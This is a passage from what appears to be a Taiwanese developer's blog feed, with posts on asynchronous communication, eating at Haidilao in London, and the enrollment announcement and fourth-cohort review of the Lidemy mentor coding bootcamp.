當場解決可能會是更好的做法。</p><p>所以說其實同步非同步各有優劣啦，依照不同的情境選擇不同種溝通方式才是上策。但我想強調的是，很多事情真的不用等到對方上線才傳訊息，就像你寄信也不會管對方是不是在電腦前一樣。</p><p>這篇純粹談一下自己對溝通的看法，主要是覺得收到那種「在嗎？」的訊息就跟收到「在嗎？」的信件差不多瞎，想問什麼問題就直接問，我如果沒辦法回我就會說沒辦法回，不用等我在的時候才把想問的東西傳給我，我就算在也不會馬上回覆。</p><p>上面講的比較多是針對工作上的討論或是其他要事的討論，跟朋友的瞎聊當然另當別論，那種想怎麼傳都可以，硬是要把一則訊息分成好幾封也都可以，輕鬆自在就好。</p><p>但如果是要討論一些正事，可以在發送訊息時多想個幾秒，想想如何減少訊息的來回，想想非同步的精神，或許就能增進一些效率。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>倫敦必吃美食</title>
      <link href="/2021/03/23/haidiliao-17e33c585350/"/>
      <url>/2021/03/23/haidiliao-17e33c585350/</url>
      
        <content type="html"><![CDATA[<p>還記得那天特別提早一點出門，就是為了避開排隊的人潮。</p><p>之前忘記從哪邊得知這件事情了 — — 在倫敦也有海底撈，而且是歐洲的第一間，好像也是唯一一間。我不是「在國外幹嘛吃台灣也有的食物啦」的那種人，也不是「在國外就是要吃台灣吃得到的食物啊」的那種，而是兩種疊加在一起，想吃的時候就去吃，無論想吃的是不是當地的食物都無所謂。</p><p>「在倫敦吃海底撈好像挺酷的」，抱持著這種想法，我在週日的時候邊逛街邊打探一下海底撈的底細，原本想說在倫敦應該沒什麼人想吃吧，但當我走近店門口的時候嚇了一跳。哇靠，人還真多，明明就是下午兩點，卻要排五十組才吃得到，而且幾乎全部都是華人面孔，也聽到許多中國口音。</p><p>那瞬間我理解了一件事，因為中國人夠多，所以儘管是只賣中國人的店，也能有一定的客群吧。對我來說海底撈沒有特別吸引人，因為那是在台灣能夠輕易取得的食物，可是對這些在英國留學或是工作的中國人來說，或許是種家鄉的味道。就像我在新加坡偶爾也會想吃台灣蛋餅或是雞排一樣（雞排其實在新加坡滿容易取得，蛋餅就困難許多）。</p><p>秉持著不輕易排隊的原則，在周遭閒晃一下之後就搭地鐵回家了，打算等明天平日的時候再跑來看看，平日應該就沒有這麼多人了吧。</p><p>為了保險起見，特地提早出門，計畫是在開店前 15 分鐘到達門口，預計最長的等待時間也大概就是 15 分鐘才對。我在路上還想說會不會只有我一個人在排隊而已。</p><p>到了店門口，發現我太低估海底撈了，我大概是第六七個人，其他人早就已經排在那還沒開的店門口了。等了一會時間差不多了，店員出來招呼客人，豪不意外地，店員也是中國人，是熟悉的中國口音。海底撈好棒啊，讓我這個不想講英文的人可以用中文來交談。</p><p>在等待座位的同時，一樣是海底撈的標準配備，會有一些點心跟飲料可以無限使用，我記得那天的點心好像是爆米花還是花生什麼的，在等待的時候觀察了一下周遭的客人，聽口音應該也都是中國人，看長相猜測是學生，可能懷念海底撈的味道了。</p><p>主要的用餐空間是在地下室，入座之後店員問我需不需要在我對面放一隻熊來陪我，我拒絕了，這樣太奇怪了。但店員又推銷了一下，說「還是放一下吧」，我想說好吧你都這樣講了，我就放一下吧。</p><p>於是我對面就坐著一隻，粉紅色的，跟我差不多大隻的熊熊。</p><p><img src="/img/haidiliao-17e33c585350/1__ngTTJH0MS__mMr9YDC2fuUw.jpeg"></p><p>剛開始的時候是沒什麼感覺的，就一隻玩偶在對面嘛，但是當時間越來越接近用餐時間，人越來越多的時候，我才意識到這是一件需要恥力的事情。因為每個路過的人都會看著那隻熊，然後再看看我，再跟朋友交頭接耳竊竊私語。我猜他們是說：「哇居然還有熊，好可愛，我也想要」，或者再加上「對面那人好怪喔」之類的。但沒記錯的話熊熊陪吃飯好像是一個人吃海底撈的專屬配備，怕你孤單寂寞覺得冷才有的服務。</p><p>點餐的時候按照慣例登入了我的海底撈帳號，看了一下消費記錄：新加坡海底撈、美國海底撈、台灣海底撈，我要特別澄清，我沒有很愛海底撈，我只是純粹覺得「吃不同國家的海底撈留下紀錄」這件事情好像很好玩，所以之前去美國的時候也跟朋友們去吃了海底撈，而且美國的那次吃得滿爽的，價格其實也不算太貴。</p><p>餐點的部份其實沒有什麼差別，或許有常吃的才會知道差在哪邊吧，之前在新加坡的時候聽中國同事說新加坡的少了很多可以點的，但我看不出來就是了。可能就像是，如果國外的鹹酥雞店家只賣雞排、鹹酥雞跟薯條，搞不好對外國人來說沒什麼，但對我來說就會覺得怎麼少了一堆選項。</p><p>這樣吃一吃大概到了 12 點左右，整間海底撈已經客滿了。而且依據我所聽到的，依舊是中國人佔大多數。我記得我有碰到一個台灣人的店員，沒記錯的話我們應該是根據口音相認的。</p><p>吃完結賬時，帳單大概 30 英鎊，換算成臺幣大概一千多，雖然換台幣看起來很貴，但是單看英鎊好像還好？畢竟吃餐廳的話應該本來就是這種價位，不過我在英國的時候好像也沒吃過幾次餐廳就是了，大多數時間我都是吃超市的無敵特價組合。</p><p>雖然大家都說英國物價滿高的，但我那時候很喜歡的英國超市的特價組合（就像便利商店三明治加飲料 49 元之類的），一個三明治加果汁再外加一份水果（葡萄跟草莓），只要 3 英鎊，折合台幣大概 120 塊，我覺得有夠超值，導致我有好多餐都吃這個組合。</p><p>總之呢，我成功在我的海底撈會員留下了一筆倫敦店的紀錄，又增添了一個新的國家。至於那天後來跑去開在英國的中國網咖打咖花了四五百塊，還創了一個 LOL 的歐服帳號角色，就是另外一個故事了。</p><p>這種東西原本都是放臉書上的，但最近這裡都沒什麼更新，也沒什麼靈感，只好把一些廢文搬過來湊個數。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫第五期開始啦！</title>
      <link href="/2021/02/24/mentor-program-5th-start-c7da09311272/"/>
      <url>/2021/02/24/mentor-program-5th-start-c7da09311272/</url>
      
        <content type="html"><![CDATA[<p>沒錯，又到了程式導師實驗計畫開始招生的時候了。</p><p>這一期一樣有把資訊更新到網站上面，如果想要看比較完整的資訊的話建議到底下的網站觀看：<a href="https://bootcamp.lidemy.com/">Lidemy 程式導師實驗計畫第五期</a></p><p>如果嫌網站資訊量太多（？）的，也可以參考這篇，我會大概講一下這在幹嘛以及跟上一期的差異。</p><h3 id="計畫詳情"><a href="#計畫詳情" class="headerlink" title="計畫詳情"></a>計畫詳情</h3><p>這個計畫的目標是：</p><blockquote><p>六個月內，把你培養成一個找得到工作的網頁工程師（前端或後端）</p></blockquote><p>教的東西很多，想看課綱可以參考：<a href="https://bootcamp.lidemy.com/syllabus.html">簡化版的課綱</a>（適合外行人觀看），詳細版的可以去 GitHub 上面看：<a href="https://github.com/Lidemy/mentor-program-5th">https://github.com/Lidemy/mentor-program-5th</a>。由於這一期課綱應該會跟前一期差不多，所以目前第五期課綱是直接完全複製第四期的，在第五期開始之前還會再做調整，大方向會是一致的，只是課程的安排會再想一下，這點請大家注意。</p><p>課程的強度其實很高，上一期如果要報名 A 求職方案的話，是寫說至少一週能付出 30 小時，但事實證明我低估了課程的強度。因此這一期直接調整成 50 個小時，如果你是毫無基礎的人的話，我們估計一週要能付出 50 個小時才能跟上課程。</p><p>所以毫無基礎的人如果不是全職學習又想參加的話，可以考慮另外一個 B 買斷方案，就是花錢上課的意思，跟課跟起來會比較沒有壓力一點。</p><h3 id="教學方式"><a href="#教學方式" class="headerlink" title="教學方式"></a>教學方式</h3><p>課程一共 26 週，前 24 週上課，最後 2 週做 final project，如果發現兩週做不完會再延長。進度的部分會按照 26 週來切，每週都會有我錄好的線上課程影片還有作業，基本上就是看影片然後做作業，然後我或是助教會批改並且給予意見。進度主要是讓六個月後想轉職的人參考的，如果沒有想轉職，按照自己的步調來就行了。</p><p>有些週的課程可能不會有影片，就會提供一些參考資源或是讓大家自己找資料，培養查資料的能力。我也會不定期開直播幫大家解惑，有什麼疑難雜症都可以提問。</p><p>課程會有一個學生專屬的學習系統，每天都可以看見其他同學做了什麼，讓你學習起來不孤單。</p><p>如果你覺得只看課程影片就好了，可以自己跟著學，其他這些學習社群、導師、批改作業跟直播你都不太需要，那可以直接上 <a href="https://lidemy.com/">Lidemy</a> 購買課程並且搭配課程大綱來學習，或是也可以直接去 Udemy 買，或去看免費的開放式課程，這樣也很不錯，而且經濟上划算許多。</p><h3 id="收費方式"><a href="#收費方式" class="headerlink" title="收費方式"></a>收費方式</h3><p>這次一樣有兩個方案，「A 求職方案」與「 B 買斷方案」。</p><p><img src="/img/mentor-program-5th-start-c7da09311272/1__G8JwXtCQOyQGu__GNWfZtUA.png"></p><p>A 求職方案是這個計畫的亮點之一：</p><blockquote><p><em>在結業後兩個月內找到工作的話，學費總額是 12% 的年薪；沒找到工作的話費用全免。</em></p></blockquote><p>但想參與的人有條件限制，必須要：</p><ol><li>有求職意願，願意在結業後去找軟體工程師相關工作</li><li>一週要能付出 50 小時以上在這個計畫</li></ol><p>如果不符合以上條件，只能選擇 B 買斷方案，基本上就是花錢買課程，學費總額是 55000 元，在課程進行二個月時要付保證金 5000 + 第一期款項 12500 &#x3D; 17500，接著每個月分期付款 12500 元付三期，中途不想繼續付的話可以選擇退出課程，後續的學費就不會再收，但請注意退出課程之後就會<strong>回歸到還沒加入課程前的狀態</strong>，也就是學習系統、群組跟課程的觀看權限都會被移除，之前繳的錢也不會退回，課程影片也會看不到，這點請特別注意。會建議真的想要把課程走完的人才報名 B 買斷方案，不然會滿虧的。</p><p>然後我要再次強調一點，那就是我知道很多想轉職的人在金錢上可能不是那麼有餘裕，所以收費方式很彈性。</p><p>第一，被選進來的話前兩個月都免費上課，在兩個月後可以決定是否要留下，不留的話就珍重再見期待再相逢，要留的話就付 5000 元保證金，並選擇你是要走 A 求職方案還是要 B 買斷方案（選擇 B 買斷方案的話同日要再繳交第一期金額 12500 元，或你要一次全付完也可以）。</p><p>第二，A 求職方案的學費會在你工作以後才分期付款，大家基本上都是分六期，一期一萬之類的。如果你經濟上有些問題，等試用期三個月過了以後再分期付款也可以，或想要分更多期都可以再討論。</p><p>第三，B 買斷方案基本上是每個月付一次錢，這樣經濟壓力應該不會這麼大，但因為仍然不是筆小數目，如果想要分更多期都可以再討論，真的很彈性。</p><p>我希望大家都是開心地繳學費，而且是真的認為這個課程有幫助所以付錢，因此才有了兩個月試用期、就業成功後才繳錢等等這些規則。</p><h3 id="跟上一期有哪些不同"><a href="#跟上一期有哪些不同" class="headerlink" title="跟上一期有哪些不同"></a>跟上一期有哪些不同</h3><ol><li>收費方式不一樣了！以前一直都是 1.5 倍月薪，現在改成用年薪來計算，會是年薪的 12%。例如說拿到的 offer 是 40k*12，年薪就是 48 萬，12% 就是 57600 元，就是你的學費總額。詳細計算方式可以參考官網。</li><li>A 求職方案的時間要求增加了，從 30 小時變成 50 小時，因為 30 小時滿低估課程強度，再加上 50 小時並不代表真的 50 小時都在寫 code，實際在寫 code 的時間可能只有 80% &#x3D; 40 小時。根據以往的經驗，能夠付出一定的時間是跟完課程的必備要素。</li><li>以往的報名表都是我一個人審，這一期的會跟助教們一起審核，所以你的報名表不只我會看到，助教們也會看到。</li><li>其餘調整都是課綱上的調整以及學習系統上的調整，計畫本身沒有太大改變</li></ol><h3 id="計畫時程表"><a href="#計畫時程表" class="headerlink" title="計畫時程表"></a>計畫時程表</h3><p>報名日期：即日起至 2021&#x2F;03&#x2F;29 晚上 11:59 分（一）<br>報名結果公告：2021&#x2F;04&#x2F;05（一）<br>開課日期：2021&#x2F;04&#x2F;12（一）<br>繳交保證金新台幣 5000 元（兩個月）：2021&#x2F;06&#x2F;12（六）<br>選擇「B 買斷方案」的同學開始分期付款：2021&#x2F;06&#x2F;12（六）<br>結業日期：2021&#x2F;10&#x2F;12（二）<br>求職截止日（在這時間點前找到工作都必須付學費）：2021&#x2F;12&#x2F;12（日）</p><h3 id="報名方式"><a href="#報名方式" class="headerlink" title="報名方式"></a>報名方式</h3><p>備註：報名已結束</p><p>會需要你去 Google 表單填寫一些基本資訊，然後去研究 Scratch 做一個小作品出來，接著自學一點程式，去 <a href="https://github.com/Lidemy/mentor-program/blob/master/codewar.md">codewar</a> 上面解出三題題目並且寫一下解題心得。</p><p>做完之後寫信到 <a href="mailto:&#104;&#x75;&#x6c;&#105;&#64;&#x6c;&#x69;&#100;&#x65;&#x6d;&#121;&#x2e;&#x63;&#111;&#x6d;">&#104;&#x75;&#x6c;&#105;&#64;&#x6c;&#x69;&#100;&#x65;&#x6d;&#121;&#x2e;&#x63;&#111;&#x6d;</a></p><p>標題請打：[報名] 程式導師實驗計畫第五期  — huli<br>（請把 huli 換成你自己的暱稱）</p><p>信件內容請附上：</p><ol><li>自我介紹（讓我更瞭解你）</li><li>報名這個計畫的理由</li><li>若成功錄取之後，你的時間安排為何（例如說目前待業，每天都有 8 小時可以寫程式；或是目前在職，但是晚上七點到十點會自學等等，如果選 A 求職計畫的請詳細說明時間安排）</li><li>你未來想做什麼？（純粹好奇而已）</li><li>平時有寫東西的習慣嗎？（像是部落格、讀書心得、電影心得或者是旅遊日記都可以，有的話可以多談談這部分或附上網址，沒有的話也沒關係）</li><li>Scratch 作品連結（請給線上可觀看連結並確認有開放觀看權限） &amp; 做完 Scratch 作品的心得</li><li>Codewar 帳號 &amp; 解 Codewar 題目的心得</li><li>任何你想跟我分享的東西（例如說你寫的小說、你畫的圖、你的一篇廢文等等。）</li><li>其他（其他任何你想補充的東西）</li></ol><p>更多資訊請參考：<a href="https://bootcamp.lidemy.com/course-info.html#anchor-registration">https://bootcamp.lidemy.com/course-info.html#anchor-registration</a></p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>還有一點要先公告一下，第五期應該會是現有制度的最後一期，如果還有下一期的話，可能不會叫這個名稱了，然後整個課程的機制應該也會全部砍掉重練。</p><p>不過還是要強調一次，這個還沒定案，只是先提出來讓大家有個心理準備，到時候真的全部改動大家才不會太驚訝。到時候如果還是維持現有機制，那可能就是新的系統還沒規劃好，或者是有什麼嚴重的缺陷導致沒有辦法開始新的機制，不然我其實滿期待新的機制的。</p><p>總之，大概就是這樣啦！除非 A 求職方案的收費方式有些微調整以及學習時數要求變高以外，其他基本上都跟第四期差不多，會想維持差不多也是因為第四期課綱我覺得跟以前相比較的話相對完整，不要動太多應該會對學習比較有幫助。</p><p>如果有什麼不清楚的可以透過 Lidemy 粉專私訊，期待你的報名，感謝！</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫第四期檢討與心得</title>
      <link href="/2021/02/22/mentor-program-4th-review-f8e8de92eea2/"/>
      <url>/2021/02/22/mentor-program-4th-review-f8e8de92eea2/</url>
      
        <content type="html"><![CDATA[<p>時間過得好快，上一次更新課程相關的東西是去年十月的這篇：<a href="/2020/10/03/lidemy-mentor-program-4th-updates-c344302c8a2d/">程式導師實驗計畫第四期課程做了哪些改動？</a>，轉眼間就已經過完年，然後整個第四期就這樣結束了。</p><p>開頭一樣直接破題，先給一些數字。</p><p>之前在上一篇（十四週尾聲時）有提過：</p><blockquote><p><em>課程正式開始後剩下 110 位同學，其中 77 人選擇 A 求職方案，剩餘 33 人選擇 B 買斷方案。</em></p></blockquote><p>在課程結束（二十六週）之前，有些同學選擇退出，有些選擇轉成 B 方案，至結業時還在 A 求職方案的同學剩下 60 個。而這 60 個同學中，</p><ul><li>有 20 個跟完課程（33%）</li><li>有 11 個跟到最後一部分（React）的課程（18%）</li><li>其餘 29 個學生進度都在課綱的 20 周之前（49%）</li></ul><p>而最後找到工作的人數為 21 人（35%，分母為 60），薪水的部分以中部來說大約是 35k，北部的話範圍大概是 42k~45k，這邊只是給個大概，因為最多人落在這個範圍，但是當然也有低於或是高於這個範圍的同學。</p><p>求職成功人數（定義：學習半年之後的兩個月內找到工作）跟第三期的比例是差不多的，一樣都是 35% 左右，算是持平。</p><p>求職成功的基本上都是落在有跟完課程或是快跟完課程的那 31 位同學，也就是說如果有把課程跟完，應該就有六七成的把握可以在結業後的兩個月內找到工作。</p><p>因此這個計畫要改善的地方很明顯就有兩個：</p><ol><li>提升跟完課程的人的求職成功率</li><li>提升跟完課程的比例</li></ol><p>可以量化的數字給完了，接下來講一下我個人心得。</p><h3 id="人數的差別"><a href="#人數的差別" class="headerlink" title="人數的差別"></a>人數的差別</h3><p>第三期剛開始時總人數大概 60 幾個，而這一期則是幾乎翻倍，有 110 個人。但其實多出來的人不少都是 B 買斷方案，這跟第三期比較不一樣，第三期求職方案大概有 55 個左右，而第四期 A 方案的人數接近 80 個，約為 1.45 倍。</p><p>相較於一二期來說，第三期的人數也是翻倍，而第三期的整個氛圍都很不錯，無論是線上的或者是線下的實體空間都是。這讓我在第四期開始的時候也滿期待的，期待會出現同樣是第三期的那種氛圍，至於是哪種氛圍，大概就是有固定幾個人可能很樂於分享，然後算是課程中的領頭羊，可以帶著大家前進。</p><p>第四期會有助教的原因之一，也是因為第三期有這些人，我才覺得助教是可行的。</p><p>但第四期結束之後我才意識到一件事，課程中的氛圍跟人數無關，而是跟人本身有關，跟每一個人的個性有關。並不是說人數多就會有那種氛圍，也不是人數少就一定沒有，還是要看每一期計畫中的學生是怎樣的。</p><p>而第四期跟第三期比起來，我覺得就少了一些這種感覺。當然還是有同學符合我心中所說的那個樣子，只是就比較少一點。這可能是可遇不可求吧，要剛好有這些個性的同學，然後還要剛好在同一期，剛好又覺得個性差不多處得來。</p><p>我講這些也不是在說第四期跟第三期比起來有比較差或是比較好，真正能比的只有那些可以量化的數字，而「每一期的氛圍如何」，只是一個陳述，它是中性的，「第三期小樹屋比較熱鬧」、「第四期小樹屋人比較多」，這些都沒有好壞之分。</p><p>而其實我們真正要想的問題應該是，如果這種氛圍只能靠特定的某些個性的人，或甚至是靠「緣分」，那是不是太消極了？是不是這種氣氛應該由我們（我與助教們）試著營造出來，而不是倚靠緣分？</p><h3 id="助教制度"><a href="#助教制度" class="headerlink" title="助教制度"></a>助教制度</h3><p>如同有同學在心得中寫到的一樣，有了助教之後，我有種退居二線的感覺。作業幾乎都是助教改，同學有問題也跑去問助教，會看到我的場合只有教學影片、直播跟每週的隨意聊時間。</p><p>而我在之前的文章中也有寫過，我其實是不喜歡這種感覺的。</p><p>對於有些人來說，可能覺得這樣很棒，會想說：「這樣太好啦，你有助教就可以運作了，你就多找一點助教，就可以招更多學生，就能躺著賺錢啦！」，如果以賺錢為首要目標的話，確實是這樣沒錯。</p><p>但這不是我想要的。我不想變成補習班招牌上的那個名字，然後偶爾露個臉當吉祥物。在某些人眼中這是可以規模化的象徵，是成功的開始，但在我眼中卻正好相反。</p><p>我想當的是第一線的老師，是在教學現場教課的那種。而第四期確實讓我有種，我好像漸漸遠離那個現場的感覺。不過助教改作業是必然會發生的，因為學生人數變多了，我一個人沒辦法負荷這麼多作業。而且我改作業其實也不一定會比助教好，因為助教程度其實更貼近學生一點，許多地方會比我做得更好。</p><p>想要把自己移回教學現場，可以想想看除了改作業以外有沒有什麼其他方法，例如說不定期直播帶 workshop 之類的，或者是多錄一些教學影片？</p><p>然後在提問的部分，下一期會把同學盡量導向公開的 <a href="https://github.com/Lidemy/forum/discussions">Lidemy 討論區</a>，針對想匿名的同學，我們也還在想要不要提供匿名的機制，最後沒有提供的話，可能會請真的一定要匿名的同學自己額外辦個帳號，反正是公開的，大家都可以來留言。</p><p>我想鼓勵這種公開討論的風氣，因為這才是對自己也是對整體來說都有利的提問方式。私訊提問的優點就只有一個，那就是不會被其他人知道你有提問而已。但公開提問的好處是：</p><ol><li>有更多人可以回答你的問題（對自己有利）</li><li>以後的人可以透過搜尋找到這個問題（對他人有利）</li></ol><p>還有一個好處是強迫你把問題講清楚，沒講清楚的話就會被回錯誤的答案或者是等待答案的時間會變長，把問題講清楚也是極其重要的技能。</p><p>下一期我會跟大家說明，有問題的話請發在討論區，私訊問助教的話，助教也只會叫你去討論區發文，除非是真的私訊才能解決的問題。</p><h3 id="期末專案"><a href="#期末專案" class="headerlink" title="期末專案"></a>期末專案</h3><p>第四期大概有三、四組同學有做期末專案，一組大概三到四個人，所以這樣算就是大概有十幾個同學都有專案。第三期的話都是個人專案，而且大概才兩三位同學有做而已。</p><p>有大家的期末專案其實都有一定的完整度，而且我會要求或建議 GitHub 的 README 寫完整一點，開發時的各種文件也都可以保存起來，底下附上其中幾組的專案連結：</p><ol><li><a href="https://github.com/krebikshaw/Give-plus-plus">Give++ 二手交易平台</a></li><li><a href="https://github.com/yunanpan/final-project">hit the road</a></li><li><a href="https://github.com/awuuu0716/MTR04-Parlando">Parlando</a></li></ol><p>課程中的期末專案一直以來都是可選的，想做就做不想做就不做，因為既然是合作的專案就可能會碰到那些大學分組報告都碰過的問題，要找到合適的組員其實也是一件要有點靠運氣的事情。</p><p>如果時間許可，那當然是有做專案比較好。但許多人光是把課程跟完就已經沒什麼時間了，在這樣的狀況下，我就會建議先在沒有專案的情況下去求職看看，真的不行再說。</p><p>講到這個，就要講一下課綱的安排。整個計畫學習是六個月，大概是 26 周左右，而最後兩週是留給大家做 final project 的時間，不過兩週應該是不夠的，大多數可能都花了一個月左右或是更久。而且前面的課程有可能會 delay，所以真正做完 final project 又是更久以後了。</p><p>或許之後可以把 final project 提前，在 20 周或更早就讓大家做點籌備？這樣好像更不錯一點。</p><h3 id="課程系統"><a href="#課程系統" class="headerlink" title="課程系統"></a>課程系統</h3><p>這一期也領悟到了一件事：</p><blockquote><p><em>該用系統擋掉的就用系統來擋，不要相信自己</em></p></blockquote><p>例如說我一再跟大家強調每週作業的挑戰題等你一般作業寫完有餘裕再去寫就好，但可能有些人看到有題目就是會手癢想寫，也沒在管進度的先寫再說，然後就拖慢了進度。</p><p>或者是覺得自己挑戰題沒解完，這週的學習就不 ok 之類的。</p><p>儘管我一再強調過沒這種事，但效果還是有限。這種其實就應該透過系統來解掉，你作業沒寫完就是看不到挑戰題，或者是進度落後就不讓你解挑戰題之類的，讓你看不到題目。</p><p>這些應該都可以用系統面來擋掉。</p><p>有一個自製的學習系統我覺得滿必要的，因為很多需求一定都是客製化產生的，所以沒有現成的可以用。就算有現成的一定也是只打中幾個需求，沒辦法完成涵蓋到所有的。</p><p>下一期的目標之一就是加強學習系統，補上一下我想加的東西。</p><h3 id="學習模式"><a href="#學習模式" class="headerlink" title="學習模式"></a>學習模式</h3><p>其實我一直在想一件事，那就是我們到底該不該限制學生的學習模式？</p><p>例如說有些人可能卡關很嚴重想要跳關，我們是該讓他跳，還是強迫他一定要先做完前面的？</p><p>或者是有些人就是很想解挑戰題，是該讓它解（儘管會讓進度落後），還是不讓它解？</p><p>我目前還沒有一個明確的答案。但如果要限制的話，我應該會在課程簡章中註明：「這不是一個讓你自由學習的課程，我們會在某些地方限制你的學習方式，因為我們覺得這種學習方式比較好，請你照著做即可。如果不喜歡這種學習方式，那可能就是不適合這個課程」</p><p>總覺得怪怪的，但好像又不會。</p><h3 id="關於金錢"><a href="#關於金錢" class="headerlink" title="關於金錢"></a>關於金錢</h3><p>前面有提過說這個課程的首要目標並不是賺錢，以前也有提過這件事，A 方案的付費模式不是因為「這樣收比較好賺」（事實上也沒有），而是因為「我只想收心甘情願付的學費」。</p><p>不過我可能也沒有大家所想的這麼佛系，有時候其實還是會在意這個的。舉例來說，A 方案是建立在互信的前提之下，我相信你每週都有付出足夠時間，也有求職意願，才符合找不到工作免學費的機制。</p><p>在這個前提之下如果看到有些付出時間不符合 A 方案卻還繼續待著的同學，心裡難免會有一點小介意。不過這件事我其實也沒有跟大家說，因為我知道有些同學其實想轉 B 方案但還沒跟我說，或者是可能真的有付出足夠的時間，但我不知道。</p><p>這部分我自己也還要再調適一下，畢竟可能真的有選了 A 方案但不符合資格又不想付錢的人，但那是少數。如果只為了這少數人而犧牲其他多數人的權益，或者是被少數人影響而導致課程變得不一樣了，那其實是損失更大的一件事。</p><p>第四期把原本的每週 40 小時調整成 30 小時其實是個錯誤，是我低估了課程的負荷。下一期會調成 45 或是 50 小時，這才是我覺得該有的負荷量，因為課程就真的是這麼重。</p><h3 id="關於求職"><a href="#關於求職" class="headerlink" title="關於求職"></a>關於求職</h3><p>這期的求職其實有兩個小問題：</p><ol><li>大家的求職時間撞在一起</li><li>碰到過年</li></ol><p>第二點我原本就有預期到了，我想說過年前找好工作，讓大家過個好年，然後年後去上班，聽起來十分合理。但今年也有受到疫情影響，職缺變少了一些，而有些公司可能是年後才會開缺。</p><p>然後第一點我倒是沒有預期，因為上一期大家就自然而然地比較分散，頂多兩三個同學面到同一間。這一期聽說有公司收了十份這邊出來的履歷，這是我當初沒有預料到的。</p><p>不過想一想，結業時間類似的話會有這種情形好像滿合理的，其他培訓班也都一樣，同時間結業就會這樣，跟其他同學競爭是不可避免的。既然競爭不可避免，那重點就不是「該怎麼不要競爭」，而是「該怎麼提升自我」。</p><p>如果能夠把自己的實力提升到超越其他求職者，其實就不用擔心競爭的問題，這是我們需要去思考的。</p><h3 id="加強實作過程"><a href="#加強實作過程" class="headerlink" title="加強實作過程"></a>加強實作過程</h3><p>在以往，我對作業的要求很簡單，就是：</p><blockquote><p><em>寫得出來</em></p></blockquote><p>對於學生實力的強弱，我可能是以作業是否能寫出來來判斷的，寫出來之後再看 code 的品質如何。但第四期我跟助教有幫幾個學生做了面試檢測，我只考一題簡單的實作題，需要 live coding 分享螢幕寫 code，沒想到這成了一個，意料之外的，我覺得很適合檢測的指標。</p><p>直接講結果，我覺得滿慘的。而且這個慘的程度，讓我一度懷疑自己的課程是不是走錯了哪一步。</p><p>第四期的同學們如果看到這裡，不用懷疑是自己的問題，因為好多個同學都是這樣，所以我覺得是教學跟課程的問題，而不是個人的問題。</p><p>那些同學們作業都寫得出來，程式碼品質我覺得也都 ok，在我心中程式實力是 ok 的，可是等到了 live coding 的時候，我跟十億人一樣驚呆了。有可能是太久沒碰原生的語法，也有可能是緊張，也可能是平時就這樣，但總之那個寫 code 的過程，對我來說是不及格的。</p><p>我在想有一種可能，那就是平時寫作業可能是一樣的模式，平常也沒感覺到什麼不對，只是時間花比較多。透過時間來彌補了「寫 code 能力」這件事情。但是在 live coding 的時候可能只給 30 分鐘，所以才會看起來滿慘的而且寫不出來，但如果是給三個小時，應該就能寫出來。</p><p>而平常看作業的時候，我跟助教們都是看到寫出來的成品而已，成品是合格的，但我覺得過程不合格。之前只要求寫的出來，但這次的經驗讓我開始思考，只有要求結果是不夠的，還要要求過程。</p><p>什麼是過程？過程就例如說是：</p><ol><li>看到題目以後，你會怎麼思考？</li><li>你會怎麼查資料？查到資料之後你會怎麼判斷是不是你要的？</li><li>複製貼上之後你會怎麼修改？</li><li>你是先做哪個功能？</li><li>錯誤訊息會怎麼解讀？</li><li>輸出不如預期時，你會怎麼 debug？</li></ol><p>這些寫程式的過程其實都是很重要的一部分，但問題是我們平常根本不會看到。因為我們只會看到結果，看到寫好的作業跟程式碼，但看不到它是怎麼被寫出來的。</p><p>或許這也有可能是寫作業速度慢的原因，因為這些過程沒有被好好培養，所以就用沒有效率的方式不斷寫著程式碼。而且因為自己也不知道，所以就一直這樣下去。</p><p>我把這個視為是以前課程都沒有思考到的一個層面，希望能在下一期試圖找到可以改善的方法。</p><h3 id="其他可加強項目"><a href="#其他可加強項目" class="headerlink" title="其他可加強項目"></a>其他可加強項目</h3><p>這邊簡單列一下順便附個理由或是背景知識，否則未來的自己會看不懂：</p><h4 id="1-有關於範例"><a href="#1-有關於範例" class="headerlink" title="#1 有關於範例"></a>#1 有關於範例</h4><p>在寫範例的時候應該按照自己在 alg101 教的那套，先拆分成 function 然後再填空，以及開始做之前先分析整個結構。直接開始寫 code 加上 debug 雖然可以忠實重現我平常寫程式的情形，但以教學來說不一定有幫助。或可以兩個版本都附，一個是 live coding 版，一個是規劃版。</p><p>另外記得附上範例程式碼。</p><h4 id="2-有關於部署"><a href="#2-有關於部署" class="headerlink" title="#2 有關於部署"></a>#2 有關於部署</h4><p>部署還是很卡，而且大家部署完還是不知道自己在幹嘛。像是這種的東西，雖然說大家查完資料都可以成功部署，但我不禁想問的是，這樣真的算是有學習到嗎？</p><p>雖然說本意就是想讓大家查資料自己學習，但有些東西並不是查查資料就能很快學會的。當你沒有任何背景知識的時候，就算把事情做完你也不知道在幹嘛。</p><p>在這種情況下，其實直接教學會是比較好的選擇。這樣的話第五期的部署我覺得好像可以直接教大家怎麼做，可能會更好一點。或者不要把部署當做作業，而是「部署後改一些什麼」當做作業，這樣既可以學會部署，也可以透過練習更熟悉這個過程。</p><h4 id="3-有關於課程"><a href="#3-有關於課程" class="headerlink" title="#3 有關於課程"></a>#3 有關於課程</h4><p>考慮再次像第三期那樣把前後端分開變成兩條路，否則以第四期來說，滿多人會在 week17&#x2F;18 卡關，但那邊其實以前端工程師來說沒有很重要。</p><p>但我其實還是滿想留的，我覺得長遠來看其實滿重要的。但或許可以一樣變成選修，覺得有興趣或是有要用到再修就好。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>以課綱來說，其實我覺得經過這幾期的改動，第四期算是比較穩定的一個版本了，大致上的順序我覺得沒太大問題，只差一些細節要調整。所以第五期的課綱應該會跟第四期長差不多。</p><p>不過最難的也就是這個細節啦，細節本來就一直有東西要調整，然後系統也是，學習系統也有很多地方可以補強。另外，第五期沒意外的話會是「舊制度」的最後一期，第五期結束之後我想把整個課程的東西砍掉重練，整個變不一樣。</p><p>這類的規劃之前已經有寫過一點，總之我想做的事情是，把一些基本的部分獨立出來，例如說簡單的 JS、HTML 